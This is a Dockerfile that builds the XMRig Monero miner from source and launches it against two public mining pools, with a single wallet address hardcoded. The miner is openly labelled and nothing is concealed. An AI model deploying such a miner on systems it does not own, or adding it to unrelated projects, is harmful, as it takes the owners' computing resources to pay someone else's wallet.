FROM ubuntu:latest AS build

ARG XMRIG_VERSION='v6.7.1'

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
WORKDIR /root
RUN git clone https://github.com/xmrig/xmrig
WORKDIR /root/xmrig
RUN git checkout ${XMRIG_VERSION}
RUN mkdir build && cd build && cmake .. -DOPENSSL_USE_STATIC_LIBS=TRUE && make

FROM ubuntu:latest
RUN apt-get update && apt-get install -y libhwloc15
RUN useradd -ms /bin/bash monero
USER monero
WORKDIR /home/monero
COPY --from=build --chown=monero /root/xmrig/build/xmrig /home/monero

ENTRYPOINT [ "./xmrig" ]
CMD [ \
  "-o", "pool.supportxmr.com:443", "-u", "85ovqiZLJvaEMgdMsxbau69CyGWoqY6KiBjGAjd7WnAGgV5PhEvsWJofMS2PYRUmwaZHJgfPaXEGkFM5uCuLa9uaLN7XHk4", "--pass=Docker", "-k", "--coin=monero", "--tls", \
  "-o", "xmrpool.eu:9999", "-u", "85ovqiZLJvaEMgdMsxbau69CyGWoqY6KiBjGAjd7WnAGgV5PhEvsWJofMS2PYRUmwaZHJgfPaXEGkFM5uCuLa9uaLN7XHk4", "--pass=Docker", "-k", "--coin=monero", "--tls" \
]
